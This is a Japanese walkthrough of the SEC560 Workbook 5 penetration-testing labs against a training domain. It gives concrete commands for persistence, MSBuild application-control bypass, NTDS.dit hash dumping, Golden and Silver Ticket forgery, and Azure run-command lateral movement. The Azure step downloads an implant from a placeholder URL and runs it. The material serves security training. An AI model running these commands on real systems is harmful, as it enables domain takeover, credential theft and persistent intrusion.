# Lab5 Walkthrough

提供された資料に基づく、SEC560 Workbook 5（セクション5：永続化と制御の回避）のウォークスルー（手順書）です。このセクションでは、侵害したシステムへのアクセスを維持する手法（永続化）、防御機構（アプリケーション制御など）のバイパス、そしてActive Directoryにおける究極の権限掌握（ドメイン支配）とチケット攻撃について学習します。

---

### Lab 5.1: Persistence (永続化)

**目的:** ターゲットシステムが再起動されたり、防御側が対策を講じたりしても、アクセスを維持するための永続化メカニズムを確立します。

**ステップ 1: サービスによる永続化**

- Metasploitの`msfvenom`等で、サービスとして動作するペイロード（例：`generate -f service`）を作成します。
- ターゲットにペイロードをアップロードし、Windowsのサービス作成コマンド（`sc.exe create`など）を使用して、システム起動時にSYSTEM権限で自動実行されるバックドアサービスを登録します。

**ステップ 2: レジストリ（Runキー）による永続化**

- Windowsのレジストリ（`HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`）にペイロードのパスを追加し、ユーザーがログオンするたびにペイロードが自動実行されるようにします。

**ステップ 3: WMIイベントフィルターによる永続化**

- WMI（Windows Management Instrumentation）を利用し、特定のシステムイベントをトリガーにペイロードを実行させます。
- このラボでは、存在しないユーザー（`fakeuser`）の**ログオン失敗（イベントID 4625）**をトリガー（Event Filter）として設定し、認証に失敗するだけでSYSTEM権限のシェルが送られてくる隠密性の高い永続化を構築します。

---

### Lab 5.2: MSBuild (Application Control Bypass)

**目的:** AppLockerなどのアプリケーション制御をバイパスし、Microsoftの正規バイナリを悪用して（Living Off the Land）悪意のあるコードを実行します。

**ステップ 1: 悪意のあるXMLプロジェクトファイルの作成**

- `MSBuild.exe`は、通常ソフトウェアのビルドに使用される正規のMicrosoft署名済みツールですが、XMLファイル内のC#コード（インラインタスク）を解釈して実行する機能があります。
- 提供されたXMLテンプレート（`build2.xml`）のCDATAセクション内に、`msfvenom`等で生成したC#形式のシェルコードを貼り付けます。

**ステップ 2: MSBuildによるペイロードの実行**

- コマンドプロンプトから以下のコマンドを実行し、正規ツール経由でシェルコードをメモリ上で実行させ、C2セッションを確立します。
    
    ```
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\CourseFiles\build2.xml
    ```
    

---

### Lab 5.3: Domain Dominance (ドメイン完全支配)

**目的:** Domain Admin権限を利用して、ドメインコントローラー（DC）からActive Directoryデータベース（`NTDS.dit`）を抽出し、ドメイン内の全ユーザーのパスワードハッシュを根こそぎ取得します。

**ステップ 1: VSSによるNTDS.ditの抽出**

- `NTDS.dit`はOSによってロックされているため、通常はコピーできません。`wmiexec.py`などでDCにアクセスし、`vssadmin`を利用してCドライブのボリュームシャドウコピーを作成します（または`ntdsutil`のIFM機能を使用します）。
- 作成したシャドウコピーから`ntds.dit`と、復号キーが含まれる`SYSTEM`レジストリハイブを抽出用フォルダにコピーします。

**ステップ 2: ハッシュのダンプ**

- 抽出したファイルをLinux環境に持ち帰り、Impacketの`secretsdump.py`を使用してオフラインで解析します。
    
    ```
    secretsdump.py -ntds ntds.dit -system system -outputfile hashes.txt LOCAL
    ```
    
- これにより、`krbtgt`アカウントを含む全ドメインユーザーのNTハッシュとKerberosキー（AES等）が取得できます。

---

### Lab 5.4: Golden Ticket (ゴールデンチケット)

**目的:** Lab 5.3で取得した`krbtgt`アカウントの情報を利用して、任意のユーザーになりすませる偽造TGT（ゴールデンチケット）を作成し、長期間（デフォルト10年）にわたるドメインの持続的アクセスを確保します。

**ステップ 1: 必要な情報の収集**

- **krbtgtのAESキー (またはNTハッシュ):** `secretsdump.py`の出力から取得します。
- **ドメイン名とドメインSID:** `ipconfig /all`でドメイン名（`hiboxy.com`）を確認し、Impacketの`lookupsid.py`を使用してドメインSIDを取得します。

**ステップ 2: チケットの作成と利用 (Impacket)**

- Linux環境からImpacketの`ticketer.py`を使用してチケットを作成します。
    
    ```
    ticketer.py -domain hiboxy.com -domain-sid <Domain_SID> -aesKey <krbtgt_AES_Key> Administrator
    ```
    
- 作成された`Administrator.ccache`を環境変数にセットし、Kerberos認証を利用してパスワードなしでDC上のコマンドを実行します。
    
    ```
    export KRB5CCNAME=Administrator.ccache
    wmiexec.py -k -no-pass -dc-ip 10.130.10.4 file01.hiboxy.com hostname
    ```
    

---

### Lab 5.5: Silver Ticket (シルバーチケット)

**目的:** コンピュータアカウント（またはサービスアカウント）のパスワードハッシュを利用して、特定のサービス（このラボではCIFS/SMB）に対してのみ有効な偽造サービスチケット（TGS）を作成します。DCと通信しないため検知されにくいのが特徴です。

**ステップ 1: ターゲットサービスの情報収集**

- `secretsdump.py`を使用して、ターゲットサーバー（例: `file01$`）のコンピュータアカウントのAES256ハッシュを取得します。
- `lookupsid.py`でドメインSIDを取得します。

**ステップ 2: Rubeusによるチケットの作成と注入 (Windows環境)**

- Windows VM上で`Rubeus.exe`を使用し、シルバーチケットを作成して現在のログオンセッションに直接注入（`/ptt`）します。
    
    ```
    Rubeus.exe silver /service:cifs/file01.hiboxy.com /aes256:<file01_AES_Key> /sid:<Domain_SID> /ptt /user:bgreen
    ```
    
- 注入後、`klist`コマンドでチケットを確認し、`dir \\file01.hiboxy.com\c$`を実行して、管理者権限でファイルサーバーにアクセスできることを確認します。

---

### Bonus Lab: Azureでのコマンド実行と横展開 (Running Commands & Lateral Movement)

**目的:** 漏洩した資格情報でAzure CLI（`az login`）にログインし、ネットワークレベルではなく**Azureコントロールプレーン**を利用して内部のVMでコマンドを実行します。

**ステップ 1: Azure CLIログインと偵察**

- 取得したユーザー（`aparker@hiboxy.com`等）で`az login`を実行し、MSALの認証フローを経てアクセストークンを取得します。
- `az vm list`コマンドで、外部からは見えなかった内部のVM（例: `hiboxy-dc1` や `Win10-Desktop1`）を特定します。

**ステップ 2: Run-Commandによるコード実行**

- Azureの`Run-Command`機能（コントロールプレーン）を使用し、ターゲットVM上でSYSTEM権限としてリモートからPowerShellスクリプト（インプラントのダウンロードと実行）を強制的に実行させます。
    
    ```
    az vm run-command invoke --command-id RunPowerShellScript --name hiboxy-dc1 -g HIBOXY --script "iwr <URL>/implant.exe -OutFile C:/Windows/Temp/implant.exe; Start-Process C:/Windows/Temp/implant.exe"
    ```
    
- これにより、従来のネットワークプロトコル（SMBやWMI）を経由せずに、クラウドインフラの管理機能を悪用したラテラルムーブメント（横展開）を達成します。